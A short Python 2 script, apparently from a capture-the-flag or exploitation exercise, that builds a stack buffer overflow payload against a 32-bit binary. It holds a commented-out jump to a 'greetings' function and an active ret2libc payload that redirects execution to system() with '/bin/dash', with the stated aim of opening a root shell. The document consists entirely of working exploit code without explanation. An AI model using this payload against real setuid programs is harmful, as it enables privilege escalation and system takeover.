#!/user/bin/bash/python

from struct import pack

##Proof of concept recalling greetings
#filler = "D"*22
#ret = pack("<I", 0x0804887c) #start of greetings
#dummy_ret = "f"*4
#print filler + ret + dummy_ret

#Need to run /bin/sh and open a root shell
filler = "D"*22
ret = pack("<I", 0x0804ef50) #start of system
dummy_ret = "f"*4
arg = pack("<I", 0xbffefaa8) #wherever shell code string is
command = "/bin/dash"
print filler + ret + dummy_ret + arg + command
